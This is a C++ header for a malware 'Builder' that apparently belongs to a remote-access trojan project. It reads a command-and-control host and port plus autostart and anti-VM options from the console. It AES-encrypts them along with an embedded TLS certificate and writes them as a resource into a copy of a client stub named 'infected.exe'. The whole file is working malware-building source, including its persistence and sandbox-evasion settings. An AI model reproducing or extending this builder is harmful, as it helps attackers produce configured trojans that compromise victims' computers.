#pragma once
#undef min

#include <iostream>
#include <Windows.h>
#include <memory>
#include <fstream>
#include <openssl/ssl.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <botan/base64.h>

#include "Aes256.hpp"
#include "Connection.hpp"
#include "Settings.hpp"

#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

#define _CRT_SECURE_NO_WARNINGS
#define STUB          L"client.exe" //in current folder
#define STUBNEW       L"infected.exe" //in current folder
#define STORELOCATION 1

typedef struct {
    char Host[300 + 1];
    char Port[300 + 1];
    char Certificate[1500 + 1];
    char Autostart[20 + 1];
    char AntiVM[20 + 1];
}Configuration;

class Builder {
private:
    std::string host;
    std::string port;
    std::string autostart;
    std::string antiVM;
public:
    void GetInput() 
    {
        // ask user for configuration variables
        std::cout << "Enter Host: ";
        std::getline(std::cin, host);
        std::cout << "Enter Port: ";
        std::getline(std::cin, port);
        std::cout << "Enter Autostart (true/false): ";
        std::getline(std::cin, autostart);
        std::cout << "Enter AntiVM (true/false): ";
        std::getline(std::cin, antiVM);
    }

	void WriteSettings() 
	{
        HANDLE hUpdate;
        Configuration* config;
        config = (Configuration*)malloc(sizeof(Configuration));
        memset(config, 0, sizeof(Configuration));

        // encrypt and put variables intu structure
        Algorithm::Aes256 aes256 = Algorithm::Aes256();

        // Copy user-input values into struct fields
        strncpy(config->Host, aes256.Encrypt(host).c_str(), sizeof(config->Host) - 1);
        config->Host[sizeof(config->Host) - 1] = '\0';
        strncpy(config->Port, aes256.Encrypt(port).c_str(), sizeof(config->Port) - 1);
        config->Port[sizeof(config->Port) - 1] = '\0';

        std::pair<X509*, EVP_PKEY*> cert = Connection::extractCertificateFromPKCS12(Settings::CertificateName, "mypassword");
        // Convert X509 certificate to DER format
        std::vector<unsigned char> derData;
        int derLen = i2d_X509(cert.first, nullptr);
        if (derLen < 0) {
            std::cerr << "Error determining DER length." << std::endl;
        }
        derData.resize(derLen);
        unsigned char* derPtr = derData.data();
        if (i2d_X509(cert.first, &derPtr) != derLen) {
            std::cerr << "Error exporting certificate to DER format." << std::endl;
            derData.clear();
        }
        strncpy(config->Certificate, aes256.Encrypt(Botan::base64_encode(derData)).c_str(), sizeof(config->Certificate) - 1);
        config->Certificate[sizeof(config->Certificate) - 1] = '\0';

        strncpy(config->Autostart, Botan::base64_encode(std::vector<uint8_t>(autostart.begin(), autostart.end())).c_str(), sizeof(config->Autostart) - 1);
        config->Autostart[sizeof(config->Autostart) - 1] = '\0';

        strncpy(config->AntiVM, Botan::base64_encode(std::vector<uint8_t>(antiVM.begin(), antiVM.end())).c_str(), sizeof(config->AntiVM) - 1);
        config->AntiVM[sizeof(config->AntiVM) - 1] = '\0';

        // Injection in resources goes here
        // Duplicate the existing client.exe to infected.exe
        if (!CopyFile(STUB, STUBNEW, FALSE)) {
            std::cerr << "CopyFile failed: " << GetLastError() << std::endl;
            return;
        }
        std::wcout << L" - infected.exe is now an empty stub" << std::endl;

        // Obtain a handle to infected.exe for resource update
        hUpdate = BeginUpdateResource(STUBNEW, FALSE);
        if (hUpdate == nullptr) {
            std::cerr << " - Failed BeginUpdateResource: " << GetLastError() << std::endl;
            return;
        }
        std::wcout << L" - Handle to infected.exe obtained" << std::endl;

        /*std::vector<uint8_t> data;
        // Iterate over each field of the Configuration struct
        const char* fields[] = { config->Host, config->Port, config->Certificate, config->Autostart, config->AntiVM };
        const size_t sizes[] = { sizeof(config->Host), sizeof(config->Port), sizeof(config->Certificate), sizeof(config->Autostart), sizeof(config->AntiVM) };
        for (size_t i = 0; i < sizeof(fields) / sizeof(fields[0]); ++i) {
            const char* field = fields[i];
            size_t size = sizes[i];
            for (size_t j = 0; j < size; ++j) {
                // Copy each character of the field into the vector
                data.push_back(static_cast<uint8_t>(field[j]));
            }
        }*/

        // Input the details into the resource location
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(STORELOCATION), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), config, sizeof(Configuration))) {
            EndUpdateResource(hUpdate, TRUE);  // Rollback the update
            std::cerr << " - Failed UpdateResource: " << GetLastError() << std::endl;
            return;
        }
        std::wcout << L" - Updated resources in infected.exe" << std::endl;

        // Finalize the update
        if (!EndUpdateResource(hUpdate, FALSE)) {
            std::cerr << " - Failed EndUpdateResource: " << GetLastError() << std::endl;
            return;
        }
        std::wcout << L" - Success, infected.exe was built." << std::endl;

		
	}
};